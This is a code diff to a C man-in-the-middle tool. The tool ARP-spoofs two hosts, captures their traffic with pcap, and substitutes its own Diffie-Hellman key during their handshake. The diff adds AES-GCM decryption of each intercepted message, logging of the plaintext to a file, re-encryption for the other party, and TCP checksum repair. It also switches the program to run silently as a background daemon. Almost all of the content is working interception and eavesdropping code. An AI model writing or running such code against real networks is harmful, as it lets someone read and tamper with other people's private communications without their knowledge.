@@ -3,6 +3,7 @@
 #include <arpa/inet.h>
 #include <assert.h>
 #include <errno.h>
+#include <fcntl.h>
 #include <gmp.h>
 #include <net/ethernet.h>
 #include <netinet/in.h>
@@ -38,9 +39,9 @@ typedef struct IP_T {
 typedef struct psd_header {
   uint32_t saddr;
   uint32_t daddr;
-  uint8_t must_be_zero; // 保留字，强制置空
-  uint8_t protocol;     // 协议类型
-  uint16_t tcp_len;     // TCP长度
+  uint8_t must_be_zero;
+  uint8_t protocol;
+  uint16_t tcp_len;
 } psd_header;
 
 struct MITM_ctx {
@@ -51,25 +52,28 @@ struct MITM_ctx {
   mpz_t client_key; //
   mpz_t server_key; //
 };
+
 struct MITM_ctx m_ctx;
+uint8_t client_key[0x20];
+uint8_t server_key[0x20];
+uint8_t *c_w;
+uint8_t *s_w;
+
+int log_fd = -1;
 
 uint16_t calc_checksum(void *pkt, int len) {
-  // 将TCP伪首部、首部、数据部分划分成16位的一个个16进制数
   uint16_t *buf = (uint16_t *)pkt;
-  // 将校验和置为0，设置为32bit是为了保留下来16bit计算溢出的位
   uint32_t checksum = 0;
-  // 对16位的数逐个相加，溢出的位加在最低位上
   while (len > 1) {
     checksum += *buf++;
-    // 前半部分将溢出的位移到最低位，后半部分去掉16bit加法溢出的位（置0）
     checksum = (checksum >> 16) + (checksum & 0xffff);
     len -= 2;
   }
   if (len) {
-    checksum += *((uint8_t *)buf); // 加上最后8位
+    checksum += *((uint8_t *)buf);
     checksum = (checksum >> 16) + (checksum & 0xffff);
   }
-  return (uint16_t)((~checksum) & 0xffff); // 取反
+  return (uint16_t)((~checksum) & 0xffff);
 }
 
 // set tcp head
@@ -98,7 +102,7 @@ int main(int argc, char **argv) {
   if (argc != 3) {
     die("[!] Usage: ./middle client_ip server_ip");
   }
-  // daemon(1, 1);               // run in background
+  daemon(1, 1);                  // run in background
   char errbuf[PCAP_ERRBUF_SIZE]; // pcap error buffer
   pcap_if_t *alldevs = NULL;
   pcap_t *descr = NULL;
@@ -116,31 +120,28 @@ int main(int argc, char **argv) {
             m_ctx.server_key, NULL);
 
   mpz_set_ui(m_ctx.g, 5); // g = 5
-  // arp
+
+  // arp cheat
   arpspoof(device, argv[1], argv[2], 8);
   arpspoof(device, argv[2], argv[1], 8);
 
-  printf("[+] Choose device %s\n", device);
+  // printf("[+] Choose device %s\n", device);
 
   descr = pcap_open_live(device, PCAP_BUF_MAX, 1, 1024, errbuf);
   if (descr == NULL) {
     die("[!] Failed to open device");
   }
 
+  log_fd = open("mitm_log.txt", O_RDWR | O_CREAT, 0666);
+  if (log_fd < 0) {
+    die("[!] Failed to open log file");
+  }
+
   char rule[128];
   memset(rule, 0, 128);
-  strncat(rule, "(src host ", 10);
-  strncat(rule, argv[1], strlen(argv[1])); // (src host ClientIP
-  strncat(rule, " and dst host ", 14);
-  strncat(rule, argv[2], strlen(argv[2])); // and dst host ServerIP
-  strncat(rule, ") or (src host ", 15);
-  strncat(rule, argv[2], strlen(argv[2])); // ) or ( src host ServerIP
-  strncat(rule, " and dst host ", 14);
-  strncat(rule, argv[1], strlen(argv[1])); // and dst host ClientIP
-  strncat(rule, ")", 1);
-  // printf("%s\n", rule);
-  // (src host ClientIP and dst host ServerIP) or
-  // (src host ServerIP and dst host ClientIP)
+  sprintf(rule,
+          "(src host %s and dst host %s) or (src host %s and dst host %s)",
+          argv[1], argv[2], argv[2], argv[1]);
 
   if (pcap_compile(descr, &filter, rule, 1, 0) < 0) {
     die("[!] Error at pcap_compile");
@@ -162,6 +163,7 @@ int main(int argc, char **argv) {
 
   mpz_clears(m_ctx.p, m_ctx.g, m_ctx.pri_key, m_ctx.pub_key, m_ctx.client_key,
              m_ctx.server_key);
+  close(log_fd);
 }
 
 void tcp_callback(IP_T *ip_t, const struct pcap_pkthdr *pkthdr,
@@ -181,24 +183,33 @@ void tcp_callback(IP_T *ip_t, const struct pcap_pkthdr *pkthdr,
                    sizeof(struct tcphdr) + 12; // head size which consist data
   int data_len = pkthdr->len - header_len;     // 数据包数据真实长度
   uint8_t *raw_data = packet + header_len;
-
+  char log_buf[0x100];
   bzero(src_ip, 16);
   bzero(dst_ip, 16);
   inet_ntop(AF_INET, &(ip->saddr), src_ip, 16); // src_ip
   inet_ntop(AF_INET, &(ip->daddr), dst_ip, 16); // dst_ip
-  printf("************************\n");
 
   if ((!strncmp(src_ip, ip_t->client_ip, strlen(src_ip))) &&
       (!strncmp(dst_ip, ip_t->server_ip, strlen(src_ip)))) {
-    printf("c(%s) -> s(%s)\n", src_ip, dst_ip);
+
     memcpy((char *)ethernet + 6, middle_mac, 6); // fix mac
     memcpy(ethernet, server_mac, 6);
-    if (data_len == 0x1000) {             // this have data we need
+
+    if (data_len == SK_BUF_MAX) { // this have data we need
+
+      bzero(log_buf, sizeof(log_buf));
+      memcpy(log_buf, "************************\n", 25);
+      sprintf(log_buf + 25, "c(%s) -> s(%s) size:%d\n", src_ip, dst_ip,
+              data_len);
+      write(log_fd, log_buf, strlen(log_buf));
+
       if (!strncmp(raw_data, "pri", 3)) { // p
+
         mpz_init_set_str(m_ctx.p, raw_data + 3, 16);
         generate_pri_key(m_ctx.pri_key);
         mpz_powm(m_ctx.pub_key, m_ctx.g, m_ctx.pri_key, m_ctx.p);
         gmp_printf("[+] middle public key(A): %Zd\n\n", m_ctx.pub_key);
+
       } else if (!strncmp(raw_data, "pub", 3)) { // pub A
 
         mpz_t A;
@@ -208,6 +219,10 @@ void tcp_callback(IP_T *ip_t, const struct pcap_pkthdr *pkthdr,
         // c_s =  A^m mod p
         mpz_powm(m_ctx.client_key, A, m_ctx.pri_key, m_ctx.p);
         gmp_printf("[+] middle-client key(A): %Zd\n\n", m_ctx.client_key);
+        mpz_get_str(client_key, 16, m_ctx.client_key);
+
+        c_w = AES_init(client_key, sizeof(client_key));
+        AES_set_iv(NULL);
 
         // write middle pub_key
         mpz_get_str(raw_data + 3, 16, m_ctx.pub_key);
@@ -225,15 +240,48 @@ void tcp_callback(IP_T *ip_t, const struct pcap_pkthdr *pkthdr,
         memcpy(checksum_ptr + sizeof(ph), tcp, tcp_len);
         tcp->check = calc_checksum(checksum_ptr, tcp_len + sizeof(ph));
         free(checksum_ptr);
+
       } else { // msg
+
+        char text[SK_BUF_MAX];
+        uint8_t msg[0x10], mac[0x10];
+        // use client key decrypt
+        bzero(text, sizeof(text));
+        AES_gcm_decrypt(raw_data, SK_BUF_MAX, text, c_w);
+        // printf("text: %s\n", text);
+        write(log_fd, text + 3, strlen(text + 3));
+        // use server key encrypt
+        AES_gcm_encrypt(text, SK_BUF_MAX, raw_data, s_w, msg, mac);
+        uint16_t tcp_len = pkthdr->len - ETHER_HDR_LEN - sizeof(struct iphdr);
+
+        // fix checksum
+        unsigned char *checksum_ptr =
+            (unsigned char *)malloc(tcp_len + sizeof(struct psd_header));
+        struct psd_header ph;
+        bzero(&ph, sizeof(struct psd_header));
+        bzero(checksum_ptr, tcp_len + sizeof(ph));
+        set_psd_header(&ph, ip, tcp_len);
+        memcpy(checksum_ptr, (void *)(&ph), sizeof(ph));
+        tcp->check = 0;
+        memcpy(checksum_ptr + sizeof(ph), tcp, tcp_len);
+        tcp->check = calc_checksum(checksum_ptr, tcp_len + sizeof(ph));
+        free(checksum_ptr);
       }
     }
   } else if ((!strncmp(src_ip, ip_t->server_ip, strlen(src_ip))) &&
              (!strncmp(dst_ip, ip_t->client_ip, strlen(src_ip)))) {
-    printf("s(%s) -> c(%s)\n", src_ip, dst_ip);
+
     memcpy((char *)ethernet + 6, middle_mac, 6); // fix mac
     memcpy(ethernet, client_mac, 6);
-    if (data_len == 0x1000) { // this have data we need
+
+    if (data_len == SK_BUF_MAX) { // this have data we need
+
+      bzero(log_buf, sizeof(log_buf));
+      memcpy(log_buf, "************************\n", 25);
+      sprintf(log_buf + 25, "s(%s) -> c(%s) size:%d\n", src_ip, dst_ip,
+              data_len);
+      write(log_fd, log_buf, strlen(log_buf));
+
       if (!strncmp(raw_data, "pub", 3)) {
         mpz_t B;
         mpz_init_set_str(B, raw_data + 3, 16);
@@ -242,6 +290,10 @@ void tcp_callback(IP_T *ip_t, const struct pcap_pkthdr *pkthdr,
         // c_s =  A^m mod p
         mpz_powm(m_ctx.server_key, B, m_ctx.pri_key, m_ctx.p);
         gmp_printf("[+] middle-server key: %Zd\n\n", m_ctx.server_key);
+        mpz_get_str(server_key, 16, m_ctx.server_key);
+
+        s_w = AES_init(server_key, sizeof(server_key));
+        AES_set_iv(NULL);
 
         // write middle pub_key
         mpz_get_str(raw_data + 3, 16, m_ctx.pub_key);
@@ -251,6 +303,7 @@ void tcp_callback(IP_T *ip_t, const struct pcap_pkthdr *pkthdr,
         unsigned char *checksum_ptr =
             (unsigned char *)malloc(tcp_len + sizeof(struct psd_header));
         struct psd_header ph;
+
         bzero(&ph, sizeof(struct psd_header));
         bzero(checksum_ptr, tcp_len + sizeof(ph));
         set_psd_header(&ph, ip, tcp_len);
@@ -259,7 +312,35 @@ void tcp_callback(IP_T *ip_t, const struct pcap_pkthdr *pkthdr,
         memcpy(checksum_ptr + sizeof(ph), tcp, tcp_len);
         tcp->check = calc_checksum(checksum_ptr, tcp_len + sizeof(ph));
         free(checksum_ptr);
+
       } else { // msg
+
+        char text[SK_BUF_MAX];
+        uint8_t msg[0x10], mac[0x10];
+
+        // use server key decrypt
+        bzero(text, sizeof(text));
+        AES_gcm_decrypt(raw_data, SK_BUF_MAX, text, s_w);
+        // printf("text: %s\n", text);
+        write(log_fd, text + 3, strlen(text + 3));
+
+        // use client key encrypt
+        AES_gcm_encrypt(text, SK_BUF_MAX, raw_data, c_w, msg, mac);
+        uint16_t tcp_len = pkthdr->len - ETHER_HDR_LEN - sizeof(struct iphdr);
+
+        // fix checksum
+        unsigned char *checksum_ptr =
+            (unsigned char *)malloc(tcp_len + sizeof(struct psd_header));
+        struct psd_header ph;
+
+        bzero(&ph, sizeof(struct psd_header));
+        bzero(checksum_ptr, tcp_len + sizeof(ph));
+        set_psd_header(&ph, ip, tcp_len);
+        memcpy(checksum_ptr, (void *)(&ph), sizeof(ph));
+        tcp->check = 0;
+        memcpy(checksum_ptr + sizeof(ph), tcp, tcp_len);
+        tcp->check = calc_checksum(checksum_ptr, tcp_len + sizeof(ph));
+        free(checksum_ptr);
       }
     }
   }
